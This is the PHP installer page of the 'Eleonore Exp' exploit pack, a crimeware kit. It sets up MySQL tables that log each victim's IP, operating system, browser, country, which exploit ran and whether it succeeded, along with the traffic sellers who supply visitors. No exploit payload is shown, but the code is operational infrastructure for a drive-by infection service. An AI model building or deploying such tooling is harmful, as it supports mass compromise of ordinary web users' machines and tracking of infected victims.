<head>
<title>.:: Eleonore Exp ::.</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
<!--
@import url("i/index.css");
-->
</style>
<!--[if IE]>
<style type="text/css">
p.note-general, p.note-warning { color: #666666; }
</style>
<![endif]-->
<!--[if IE 6]>
<style type="text/css">
#footer { height: 1em; }
</style>
<![endif]-->
<!--[if IE 5.5]>
<style type="text/css">
pre { width: 453px; }
</style>
<![endif]-->
</head>
<body id="gordonmac-com" class="homepage">
<div id="wrapper-a">
  <div id="wrapper-b">
    <div id="heading">
      <h1><a href="#">Exploit PAck</a></h1>
      <h2>Exploit pack</h2>

      <p id="heading-intro">Eleonore Exp PACK install...</p>
      
      <ul id="nav-a">
		
			
      </ul>
    </div>
    <div id="content">
      <div id="content-a">
        <div id="content-a-inner">
          <center>
		  <br>	  
<?php

include ("config.php");
if (!($c = mysql_connect($db_host, $db_user, $db_pass))) {
die(" MYSQL ERROR! Check host, user or password");
}if (!mysql_select_db($db_name,$c))
{die(" MYSQL ERROR! Check DB name");}
if (!mysql_query("DROP TABLE IF EXISTS `statistic`;",$c)) die("MYSQL ERROR! Check permission for user '".$db_user."'");
if (!mysql_query("DROP TABLE IF EXISTS `seller`;",$c)) die("MYSQL ERROR! Check permission for user '".$db_user."'");
if (!mysql_query("CREATE TABLE `statistic` (
`id` int(10) NOT NULL auto_increment,
`ip` varchar(15) default NULL,
`os` varchar(30) default NULL,
`br` varchar(30) default NULL,
`country` varchar(2) default '--',
`good` int(1) NOT NULL default '0',
`mv` int(1) NOT NULL default '0',
`refer` varchar(300) NOT NULL,
`date` datetime default '2009-01-01 00:00:00',
`spl` varchar(30) default NULL,
`seller` varchar(150) default NULL,
PRIMARY KEY  (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1;",$c)) die("MYSQL ERROR! Check permission for user '".$db_user."'");
if (!mysql_query("CREATE TABLE `seller` (
`id` int(10) NOT NULL auto_increment,
`name` varchar(30) default NULL,
`link` varchar(150) default NULL,
`desc` varchar(500) default NULL,
PRIMARY KEY  (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1;",$c)) die("MYSQL ERROR! Check permission for user '".$db_user."'");
die("
<br><br>
<b>Installation Eleonore Exp is finished. Please delete install.php</b>
</center><br><br></body></html>");

?>
